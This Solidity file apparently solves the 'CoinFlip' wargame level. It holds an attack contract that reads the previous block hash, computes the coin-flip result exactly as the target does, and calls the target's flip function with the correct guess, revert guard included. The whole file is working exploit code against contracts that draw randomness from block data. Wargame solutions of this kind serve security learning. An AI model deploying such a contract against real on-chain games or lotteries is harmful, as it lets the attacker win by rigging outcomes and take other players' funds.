// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ICoinFlip {
  function flip(bool _guess) external returns (bool);
}

contract CoinFlipAttack {
  ICoinFlip public coinFlipContract;

  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  constructor(address _coinFlipContract) {
    coinFlipContract = ICoinFlip(_coinFlipContract);
  }

  function callFlip() external {
    bool guess = generateGuessValue();
    coinFlipContract.flip(guess);
  }

  function generateGuessValue() internal returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number - 1));

    if (lastHash == blockValue) {
      revert("Whopsie, this transaction was executed in the same block as the previous one");
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue / FACTOR;
    return coinFlip == 1 ? true : false;
  }

}